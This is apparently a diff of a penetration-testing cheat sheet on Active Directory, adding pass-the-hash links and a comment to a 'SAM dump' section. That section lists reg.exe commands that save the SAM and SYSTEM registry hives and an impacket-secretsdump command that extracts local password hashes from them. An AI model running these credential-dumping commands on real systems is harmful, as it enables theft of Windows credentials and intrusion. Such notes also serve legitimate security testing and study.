@@ -102,17 +102,21 @@ AD-miner -c -cf My_Report -u neo4j -p mypassword
 https://github.com/Mazars-Tech/AD_Miner
 
 
-NTLM
+NTLM / Pass the hash
 ---
 https://www.scip.ch/en/?labs.20210909
 
 https://beta.hackndo.com/pass-the-hash/
+
+https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
+
 
 SAM dump
 ---
 ```
 reg.exe save hklm\sam sam.save
 reg.exe save hklm\system system.save
+# Files transfert
 impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
 
